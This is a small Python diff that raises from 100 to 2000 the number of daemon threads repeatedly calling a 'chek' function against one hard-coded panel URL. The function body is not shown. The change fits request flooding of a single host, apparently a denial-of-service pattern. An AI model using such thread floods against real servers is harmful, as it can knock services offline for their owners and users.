@@ -18,7 +18,7 @@ def chek(url):
 
 def start_threads():
     target_url = "http://35-panel.x10.mx/FURKAN/connect"
-    for _ in range(100):
+    for _ in range(2000):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True  # يجعل الثريدات تتوقف عند إيقاف السيرفر
         thread.start()
